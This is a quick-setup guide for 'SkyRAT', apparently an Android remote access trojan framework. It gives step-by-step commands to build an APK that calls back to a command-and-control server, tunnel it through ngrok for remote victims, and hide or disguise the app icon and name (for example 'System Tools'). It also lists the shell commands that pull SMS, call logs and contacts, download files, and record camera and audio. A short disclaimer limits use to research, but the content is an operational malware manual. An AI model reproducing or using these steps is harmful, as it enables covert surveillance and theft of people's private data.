# SkyRAT Quick Setup Guide

## 🚀 Fast Track Installation

### **Repository Setup**
```bash
# Clone SkyRAT repository
git clone https://github.com/techsky-eh/skyrat.git
cd skyrat

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# or
venv\Scripts\activate     # Windows

# Install Python dependencies
pip3 install -r requirements.txt

# Setup Android SDK (automated)
chmod +x tools/android-sdk-setup.sh
./tools/android-sdk-setup.sh
```

### **Verify Installation**
```bash
# Test framework
python3 skyrat.py --help

# Check Android build capability
cd android && ./gradlew tasks
```

## 📱 Quick Build & Test

### **1. Build APK (Local Network)**
```bash
# Replace with your actual IP
python3 skyrat.py --build -i 192.168.1.100 -p 8000 -o test.apk
```

### **2. Start C&C Server**
```bash
# Start server and wait for connections
python3 skyrat.py --shell -i 192.168.1.100 -p 8000
```

### **3. Install & Test APK**
```bash
# Install on test device
adb install build/test.apk

# Grant permissions when prompted
# App will connect automatically
```

## 🌐 External Access (Optional)

### **Using Ngrok for Remote Access**
```bash
# Build with automatic ngrok tunnel
python3 skyrat.py --build --ngrok -p 8000 -o remote.apk

# Server starts automatically after build
# Share the APK for external testing
```

## 🔧 Configuration Options

### **Build Variants**
```bash
# Hidden app (default)
python3 skyrat.py --build -i IP -p PORT -o hidden.apk

# Visible app icon
python3 skyrat.py --build -i IP -p PORT --visible-icon -o visible.apk

# Custom app name
python3 skyrat.py --build -i IP -p PORT --app-name "System Tools" -o custom.apk
```

### **Server Options**
```bash
# Basic server
python3 skyrat.py --shell -i IP -p PORT

# Debug mode (verbose output)
python3 skyrat.py --shell -i IP -p PORT --debug

# Clean build (remove old files)
python3 skyrat.py --build --clean -i IP -p PORT
```

## 📂 Repository Structure
```
skyrat/
├── skyrat.py              # Main entry point
├── utils/                 # Core framework modules
├── android/               # Android source code
├── build/                 # Generated APKs
├── dumps/                 # Downloaded data
├── tools/                 # Setup scripts
└── docs/                  # Documentation
```

## 🎯 Essential Commands

### **Device Information**
```bash
SkyRAT:/> deviceInfo       # Complete device details
SkyRAT:/> getIP            # Device IP address
SkyRAT:/> sysinfo          # System information
```

### **Data Extraction**
```bash
SkyRAT:/> getSMS inbox     # SMS messages
SkyRAT:/> getCallLogs      # Call history  
SkyRAT:/> getContacts      # Contact list
SkyRAT:/> getApps          # Installed apps
```

### **File Operations**
```bash
SkyRAT:/> ls /sdcard/      # List files
SkyRAT:/> download /path/file.jpg  # Download file
SkyRAT:/> upload local.txt         # Upload file
```

### **Recording**
```bash
SkyRAT:/> camList          # Available cameras
SkyRAT:/> startVideo 0     # Start recording
SkyRAT:/> stopVideo        # Stop & download
SkyRAT:/> startAudio       # Start audio
SkyRAT:/> stopAudio        # Stop & download
```

## ⚠️ Important Notes

### **Security Research Only**
- Use only on devices you own or have explicit permission to test
- Follow responsible disclosure practices
- Comply with local cybersecurity laws
- Document all testing activities

### **Testing Environment**
- Use isolated networks for testing
- Document device configurations
- Maintain proper audit trails
- Follow ethical security research guidelines

### **Troubleshooting**
```bash
# Check Java installation
java -version

# Verify Android SDK
echo $ANDROID_HOME

# Test network connectivity
ping YOUR_SERVER_IP

# Check port availability
netstat -ln | grep 8000
```

## 🆘 Getting Help

### **Repository Support**
- **Issues**: https://github.com/techsky-eh/skyrat/issues
- **Discussions**: https://github.com/techsky-eh/skyrat/discussions
- **Wiki**: https://github.com/techsky-eh/skyrat/wiki

### **Community Resources**
- Read the full [README.md](README.md) for comprehensive documentation
- Check [docs/](docs/) for detailed guides
- Review [examples/](examples/) for usage scenarios

### **Quick Fixes**
```bash
# Clean everything and rebuild
python3 skyrat.py --build --clean -i IP -p PORT

# Reset Android project
cd android && ./gradlew clean

# Reinstall dependencies
pip3 install -r requirements.txt --force-reinstall
```

---

**Ready to start? Run the setup commands above and you'll have SkyRAT operational in minutes!**

For detailed documentation, security guidelines, and advanced features, see the main [README.md](README.md).